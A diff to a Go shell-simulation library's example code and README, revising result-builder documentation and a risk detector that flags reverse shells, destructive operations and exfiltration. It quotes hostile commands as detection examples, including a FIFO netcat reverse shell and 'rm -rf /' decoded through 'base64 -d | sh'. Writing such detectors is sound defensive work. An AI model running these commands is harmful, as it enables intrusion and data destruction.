@@ -74,10 +74,9 @@ func main() {
 			if err := shell.State().SetVariable("LAST_COMMAND", invocation.Name); err != nil {
 				return nil, err
 			}
-			return &libcommand.CommandResult{
-				Stdout:   []byte("accepted\n"),
-				ExitCode: 0,
-			}, nil
+			return shell.Result(shell.Output().
+				Stdout(libcommand.Resolved([]byte("accepted\n"))).
+				Build()), nil
 		}).
 		Build()
 
@@ -435,6 +434,10 @@ runtime path construction:
   `Redirect.Unresolved`
 - virtual filesystem, input, option, lookup, arithmetic, and nested-execution
   operations exposed by `CommandContext`
+- `Output` and `Result` for one command outcome; the output builder defaults to
+  resolved empty stdout/stderr and resolved exit code zero
+- `ForkState`, `NewResult`, and `AddOutput` for commands with multiple possible
+  state-and-output outcomes
 
 State mutations are path-local, copy-on-write, and checked against the logical
 materialization budget. A parent snapshot is immutable and its retained state
@@ -447,15 +450,23 @@ Result behavior is explicit:
 
 | Return | Meaning |
 | --- | --- |
-| Non-nil result, nil error | Apply stdout, stderr, exit code, action, or a declarative operation. |
-| `command.UnresolvedResult()`, nil error | Output streams and exit status are unknown. |
+| `command.Result(command.Output()...Build())`, nil error | Apply one output and the active state. |
+| A result populated with `AddOutput`, nil error | Fork one runtime path for each output and its explicitly supplied state. |
+| An output containing `Unresolved(...)` | Preserve the representative value while marking that dimension unresolved. |
 | Nil result, nil error | Decline the invocation and use unresolved-command behavior. |
+| Empty result, nil error | Same as a nil result; it never removes the active path. |
 | Non-nil error | Abort simulation and return the error. |
 | `CommandStop` | Terminate all active and pending paths successfully. |
 
-Handler panics are converted to simulation errors. Returned stdout and stderr
-are budget-checked after the callback returns, but external side effects that
-already occurred cannot be rolled back.
+For a multi-outcome command, call `ForkState` once per outcome, mutate only
+those child states, then add each with `result.AddOutput(child, output)`. A
+normal single-outcome command should mutate the active state and use `Result`;
+it does not need to clone state. Outputs are immutable after return.
+
+Handler panics are converted to simulation errors. Returned streams and output
+states are budget-checked after the callback returns, and each additional
+output consumes an execution step. External side effects that already occurred
+cannot be rolled back.
 
 ### Built-in risk analysis
 
@@ -484,18 +495,24 @@ interactive Shells whose input is connected to a concrete `/dev/tcp` or
 attach process streams and launch a Shell. `Curl` reports uploads whose payload
 is read from a local file or stdin through upload, data, JSON, or multipart-form
 options; ordinary requests, downloads, and inline request data are not reported.
-Ordinary file writes, other standalone network clients or redirections, local
-interpreter programs, and local Shell pipelines are intentionally not classified as risks. A detection is returned as
+Ordinary file writes, other standalone network clients or redirections, and
+local interpreter programs are intentionally not classified as risks. A detection is returned as
 `*analysis.DetectionError`, whose `Type` is one of `reverse_shell`,
 `destructive_operation`, `sensitive_information_disclosure`, or
 `data_exfiltration`, and is propagated by `Simulate`. Inconclusive or unresolved
 input is treated as safe and retains unresolved-command behavior.
 Direct command registration uses exact expanded names, so `/bin/rm` must be
-registered separately if required. Middleware that enables the complete
-detector set can call `analysis.Lookup(invocation.Name)`; it resolves executable
-paths plus `mkfs.*` and versioned Python names from the same registry. Nested
-decoded source still returns through normal dispatch: registering only
-`analysis.RM` detects `rm -rf /` decoded by `base64 -d | sh`.
+registered separately if required. Middleware owns its detector registry and
+lookup policy; the `analysis` package does not enable commands globally.
+Attach a fresh `analysis.NewSession` to each simulation context with
+`analysis.WithSession`; it can correlate caller-selected `Mkfifo`, `Cat`,
+`Shell`, and `NC` detectors. It reports the high-confidence FIFO
+reverse-shell flow `mkfifo f; cat f | bash -i | nc host port > f`, while
+independent commands or explicit stdin replacements do not establish a flow.
+Call `analysis.Inspect` for every invocation, including commands without a
+detector, so unrelated commands break pending flow. Nested decoded source still
+returns through normal dispatch: registering only `analysis.RM` detects
+`rm -rf /` decoded by `base64 -d | sh`.
 
 ## Resource model
 
